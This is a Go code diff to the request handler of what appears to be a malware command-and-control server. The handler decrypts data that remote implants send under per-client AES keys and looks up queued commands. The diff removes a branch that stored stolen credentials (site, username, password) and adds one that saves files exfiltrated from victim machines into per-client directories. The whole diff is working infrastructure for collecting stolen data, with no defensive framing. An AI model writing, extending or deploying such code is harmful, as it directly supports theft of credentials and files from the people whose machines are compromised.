@@ -9,6 +9,7 @@ import (
 	"net"
 	"net/http"
 	"os"
+	"path/filepath"
 	"strings"
 
 	"github.com/alecthomas/kingpin"
@@ -137,8 +138,9 @@ func handlePost(w http.ResponseWriter, r *http.Request) {
 	}
 	var obj []byte
 	var err error
+	remoteUUID := r.Header.Get("X-UUID")
 	if len(genericData.UUID) != 0 {
-		aeskey, x1, x2 := db.GetKeysByUUID(r.Header.Get("X-UUID"))
+		aeskey, x1, x2 := db.GetKeysByUUID(remoteUUID)
 		obj, err = kes.DecryptObject(genericData.Object, aeskey, x1, x2)
 		if err != nil {
 			log.Error(err)
@@ -156,7 +158,7 @@ func handlePost(w http.ResponseWriter, r *http.Request) {
 			w.WriteHeader(503)
 			return
 		}
-		uid := r.Header.Get("X-UUID")
+		uid := remoteUUID
 		cmd := db.GetCmdByID(genericData.CmdID)
 		name, err := datastore.GetNameByUUID(uid)
 		if err != nil {
@@ -182,7 +184,7 @@ func handlePost(w http.ResponseWriter, r *http.Request) {
 			return
 		}
 		if fileObj.Error != 0 {
-			n, err := datastore.GetNameByUUID(r.Header.Get("X-UUID"))
+			n, err := datastore.GetNameByUUID(remoteUUID)
 			if err != nil {
 				log.Error(err)
 			}
@@ -192,31 +194,41 @@ func handlePost(w http.ResponseWriter, r *http.Request) {
 			fmt.Println(s)
 			log.WithField("status", "error").Error(fileObj.ErrVal)
 			fmt.Println(brk)
-
 		}
 	case 3:
-		pwObj := &models.KarObjectCred{}
-		if err = json.Unmarshal(obj, pwObj); err != nil {
+		files := &[]models.KarObjectFile{}
+		if err = json.Unmarshal(obj, files); err != nil {
 			log.Error(err)
 			w.WriteHeader(503)
 			return
 		}
-		n, err := datastore.GetNameByUUID(r.Header.Get("X-UUID"))
+		name, err := datastore.GetNameByUUID(remoteUUID)
 		if err != nil {
 			log.Error(err)
+			w.WriteHeader(503)
+			return
 		}
-		if err = db.InsertCreds(r.Header.Get("X-UUID"), pwObj.Platform, pwObj.Creds.Url, pwObj.Creds.Username, pwObj.Creds.Password); err != nil {
+		if err = os.MkdirAll(name, 0644); err != nil {
 			log.Error(err)
 			w.WriteHeader(503)
 			return
 		}
-		s := fmt.Sprintf("\n%s | %s\n", n, r.RemoteAddr)
-		brk := strings.Repeat("-", len(s))
-		fmt.Println("\n" + brk)
-		fmt.Println(s)
-		log.WithField("status", "success").Infof("received and logged credentials from %s", r.RemoteAddr)
-		fmt.Println(brk)
-
+		for _, f := range *files {
+			path := filepath.Join(name, filepath.Base(f.FileName))
+			if err := os.WriteFile(path, f.FileBytes, 0644); err != nil {
+				log.Error(err)
+				w.WriteHeader(503)
+				return
+			}
+			cmd := db.GetCmdByID(genericData.CmdID)
+			s := fmt.Sprintf("\n%s | %s\n", name, r.RemoteAddr)
+			brk := strings.Repeat("-", len(s))
+			fmt.Println("\n" + brk)
+			fmt.Println(s)
+			log.WithField("status", "success").Info(cmd)
+			log.Infof("Received %d files from %s. Written to %s/ directory", len(*files), name, name)
+			fmt.Println(brk)
+		}
 	}
 	w.WriteHeader(503)
 }
